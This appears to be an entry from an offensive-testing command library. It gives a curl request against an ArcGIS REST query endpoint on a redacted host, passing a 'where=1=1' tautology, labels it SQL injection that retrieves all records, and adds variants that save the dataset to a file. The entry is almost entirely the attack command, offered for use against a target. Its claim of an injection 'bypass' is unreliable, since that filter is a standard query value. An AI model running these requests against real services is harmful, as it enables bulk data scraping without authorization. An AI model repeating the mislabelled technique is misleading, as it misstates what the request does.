---
id: cmd-002
data: >-
  curl
  "https://█████/arcgis/rest/services/Data/ANC_External/MapServer/1/query?where=1%3D1&text=&objectIds=&time=&timeRelation=esriTimeRelationOverlaps&geometry=&geometryType=esriGeometryEnvelope&inSR=&spatialRel=esriSpatialRelIntersects&distance=&units=esriSRUnit_Foot&relationParam=&outFields=&returnGeometry=true&returnTrueCurves=false&maxAllowableOffset=&geometryPrecision=&outSR=&havingClause=&returnIdsOnly=false&returnCountOnly=false&orderByFields=&groupByFieldsForStatistics=&outStatistics=&returnZ=false&returnM=false&gdbVersion=&historicMoment=&returnDistinctValues=false&resultOffset=&resultRecordCount=&returnExtentOnly=false&sqlFormat=none&datumTransformation=&parameterValues=&rangeValues=&quantizationParameters=&featureEncoding=esriDefault&f=html"
tags:
  - sqli
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.171Z'
verified: false
validated: true
submitted: true
---
# curl-sqli-tautology

## Command

```bash
curl "https://█████/arcgis/rest/services/Data/ANC_External/MapServer/1/query?where=1%3D1&text=&objectIds=&time=&timeRelation=esriTimeRelationOverlaps&geometry=&geometryType=esriGeometryEnvelope&inSR=&spatialRel=esriSpatialRelIntersects&distance=&units=esriSRUnit_Foot&relationParam=&outFields=&returnGeometry=true&returnTrueCurves=false&maxAllowableOffset=&geometryPrecision=&outSR=&havingClause=&returnIdsOnly=false&returnCountOnly=false&orderByFields=&groupByFieldsForStatistics=&outStatistics=&returnZ=false&returnM=false&gdbVersion=&historicMoment=&returnDistinctValues=false&resultOffset=&resultRecordCount=&returnExtentOnly=false&sqlFormat=none&datumTransformation=&parameterValues=&rangeValues=&quantizationParameters=&featureEncoding=esriDefault&f=html"
```

## Description

Injects '1=1' into the 'where' parameter to retrieve all records via SQL injection. Ideal for testing ArcGIS vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| where=1%3D1 | URL-encoded tautology payload | Yes |
| f=html | Output format | Yes |
| -v | Verbose for debugging (optional) | No |

## Examples

### Basic Usage

```bash
curl "https://target/arcgis/.../query?where=1%3D1&f=html"
```

### Advanced Usage

```bash
curl -v -o all_records.html "https://target/arcgis/.../query?where=1%3D1&f=html"
```

## Expected Output

HTML with full dataset records, indicating successful bypass.

## Related

- [[Related Procedure: Test-SQL-Injection-with-Tautological-Condition]]
